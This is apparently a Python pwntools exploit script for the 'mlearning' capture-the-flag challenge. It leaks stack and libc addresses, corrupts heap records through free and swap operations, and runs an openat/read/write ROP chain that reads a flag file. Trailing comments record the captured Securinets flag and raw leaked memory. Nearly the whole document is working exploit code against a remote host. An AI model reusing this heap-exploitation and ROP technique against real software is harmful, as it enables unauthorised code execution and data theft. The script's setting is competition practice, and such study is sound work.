#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 20.203.124.220 --port 1234 ./mlearning
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./mlearning_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '20.203.124.220'
port = int(args.PORT or 1234)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x5555555558e4
# b *0x5555555556f2
# b *0x555555555822
# b *0x555555555780
continue

b *0x5555555559b2
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


io = ""
libc = ELF("./libc.so.6")

def new(longs,desc):
    io.sendlineafter(b"> ",b"1")
    io.sendlineafter(b"name?(0,1)\n",str(longs).encode())
    io.sendafter(b"iption:\n",desc)

# def add(size, data):
#     io.sendlineafter(b'> ', b'1')
#     io.sendlineafter(b'\n', str((size - 304)//24).encode('ascii'))
#     io.sendafter(b'\n', data)

def free(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', str(idx).encode())

def view(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'\n', str(idx).encode('ascii'))

def swap(a,b):
    io.sendlineafter(b'>', b'2')
    io.sendafter(b':\n', str(a).ljust(7,b"\x00").encode())
    io.send(str(b).ljust(7,b"\x00").encode())

def main():
    global io
    io = start()
    io.recv()
    io.send(b'\xd0')

    io.recvuntil(b'#')
    stack_leak = u64(io.recv(6).ljust(8, b'\x00')) - 0xd8 -0x8
    print(hex(stack_leak))
    new((0x900 - 304)//24, b'a')
    new((0x180 - 304)//24, b'a'*8)

    view(1)
    io.recvuntil(b'a'*8)

    libc.address = u64(io.recv(8)) - 0x3ebe10
    print(hex(libc.address))

    new(0, b"A"*100) # 2
    new(0, p64(stack_leak)+b'Z'*20) # 3
    free(2)
    swap(2,3)
    new(0, "B"*8) # 2

    pop_rdi = libc.address + 0x000000000002164f
    pop_rsi = libc.address + 0x0000000000023a6a
    pop_rdx = libc.address + 0x0000000000001b96
    pop_rax = libc.address + 0x000000000001b500
    syscall_ret = next(libc.search(asm("syscall ; ret")))

    def syscall(rax, rdi, rsi, rdx,skip=True):
        if skip:
            chain = p64(pop_rax) + p64(rax)
        chain += p64(pop_rdi) + p64(rdi)
        chain += p64(pop_rsi) + p64(rsi)
        chain += p64(pop_rdx) + p64(rdx) 
        chain += p64(syscall_ret)
        return chain

    writable_addr = stack_leak-0x200

    p = "C"*8
    p += syscall(0x101, 0xffffffff-99,stack_leak+224,0)
    p += syscall(0,3,writable_addr,255)
    p += syscall(1,1,writable_addr,255)

    p += b"/home/ctf/flag.txt".ljust(8*4,b"\x00")
    print(len(p))

    new(0, p) # 4
    view(4)
    io.recvuntil(b"Content:\n")
    leak = io.recvuntil(b"1- New Record",drop=True)

    io.sendlineafter(b'>', b'5')

    print(io.recv())
    try:
        print(io.recv())
        io.interactive()
        return True
    except:
        print("fail")
    io.close()
    return False

while(1):

    if main() :
        break

# 0x7ffd10ec72f0
# 0x7f7eb0ca6000
# 256
# here
 
# Securinets{9caa201c3371bcc77328923dfc6d33ff}
# \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00b\x89�p+.\x00\x00\x00\x00\x00\x00\x00\x00 �s�U�s��\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00�r��\x7f\x00���\xb0~\x7f\x00\x10\x000\x00\x00r��\x7f\x00�q��]Ӱ~\x7f\x00

